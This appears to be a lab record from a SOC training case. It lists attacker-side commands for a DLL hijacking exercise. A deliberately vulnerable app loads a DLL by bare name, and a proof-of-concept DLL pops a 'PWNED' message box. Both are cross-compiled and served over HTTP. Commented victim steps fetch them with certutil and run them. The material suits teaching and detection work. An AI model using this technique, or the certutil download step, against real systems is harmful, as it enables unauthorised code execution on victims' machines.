@@ -1,0 +1,39 @@
+# SOC-Case-DLL-Hijacking — Kali (attacker) commands
+# Host: butch@butch, observed IP this run: 192.168.100.107
+# Screenshots: evidence/01-payload.png, evidence/02-kali-binaries-built.png
+
+# 1. Vulnerable app — loads hijackme.dll by BARE NAME (no path) = the vulnerability
+cat > vulnapp.c <<'EOF'
+#include <windows.h>
+void main(){ LoadLibraryA("hijackme.dll"); }
+EOF
+
+# 2. Malicious DLL — DllMain fires on attach, pops "PWNED" box as code-execution proof
+cat > evil.c <<'EOF'
+#include <windows.h>
+BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r){
+    if(reason==DLL_PROCESS_ATTACH)
+        MessageBoxA(NULL, "DLL Hijack OK - code executed", "PWNED", 0x40);
+    return TRUE;
+}
+EOF
+
+# 3. Cross-compile for Windows (32-bit MinGW)
+i686-w64-mingw32-gcc vulnapp.c -o vulnapp.exe
+i686-w64-mingw32-gcc -shared evil.c -o hijackme.dll
+ls -la vulnapp.exe hijackme.dll
+#   hijackme.dll   87775 bytes
+#   vulnapp.exe   122421 bytes
+
+# 4. Serve over HTTP (victim downloads with certutil)
+sudo python3 -m http.server 80
+#   -> http://192.168.100.107/vulnapp.exe
+#   -> http://192.168.100.107/hijackme.dll
+
+# ------------------------------------------------------------------
+# Victim-side (PowerShell, DESKTOP-F0JVTQT\bryll) — for reference only
+# ------------------------------------------------------------------
+# mkdir C:\Users\Public\hijack; cd C:\Users\Public\hijack
+# certutil -urlcache -split -f http://192.168.100.107/vulnapp.exe   C:\Users\Public\hijack\vulnapp.exe
+# certutil -urlcache -split -f http://192.168.100.107/hijackme.dll C:\Users\Public\hijack\hijackme.dll
+# C:\Users\Public\hijack\vulnapp.exe   # -> MessageBox "PWNED / DLL Hijack OK - code executed"
